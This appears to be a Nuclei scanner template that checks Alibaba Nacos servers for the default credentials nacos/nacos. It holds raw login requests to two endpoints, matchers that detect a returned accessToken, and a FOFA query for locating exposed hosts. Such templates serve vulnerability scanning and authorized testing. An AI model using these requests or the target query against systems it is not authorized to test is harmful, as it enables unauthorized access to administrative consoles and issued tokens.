http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"accessToken":'
    - '"username":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - nacos
    username:
    - nacos
  raw:
  - 'POST /v1/auth/users/login  HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Nacos-Server

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  - 'POST /nacos/v1/auth/users/login  HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Nacos-Server

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  stop-at-first-match: true
id: nacos-default-login
info:
  author: SleepingBag945
  classification:
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  description: 'The default username and password for Nacos are both nacos.

    '
  metadata:
    fofa-query: title=="Nacos"
    max-request: 2
    product: nacos
    vendor: alibaba
    verified: true
  name: Alibaba Nacos - Default Login
  severity: high
  tags: nacos,default-login,alibaba,vuln
